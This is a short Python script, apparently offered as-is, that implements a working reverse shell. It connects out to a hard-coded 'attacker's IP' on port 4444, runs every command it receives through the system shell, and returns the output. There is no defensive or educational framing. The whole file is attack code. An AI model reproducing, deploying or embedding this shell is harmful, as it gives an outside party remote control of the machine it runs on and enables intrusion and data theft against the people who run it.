import socket
import subprocess
import os

def create_reverse_shell(server_ip, server_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    
    s.close()

if __name__ == "__main__":
    server_ip = '192.168.1.10'  # Change to attacker's IP
    server_port = 4444
    create_reverse_shell(server_ip, server_port)